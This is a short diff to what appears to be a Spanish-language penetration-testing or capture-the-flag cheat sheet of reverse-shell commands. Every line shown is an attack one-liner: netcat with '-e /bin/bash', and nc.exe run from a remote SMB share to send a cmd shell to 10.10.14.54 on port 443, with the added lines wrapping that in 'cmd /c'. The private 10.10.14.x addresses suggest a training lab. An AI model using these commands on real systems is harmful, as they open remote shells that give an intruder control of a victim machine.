@@ -31,3 +31,9 @@ nc -e /bin/bash 10.10.14.31 443
 ```
 \\10.10.14.54\smbFolder\nc.exe -e cmd 10.10.14.54 443
 ```
+
+Si hay que invocar a la consola
+
+```
+cmd /c \\10.10.14.54\smbFolder\nc.exe -e cmd 10.10.14.54 443
+```
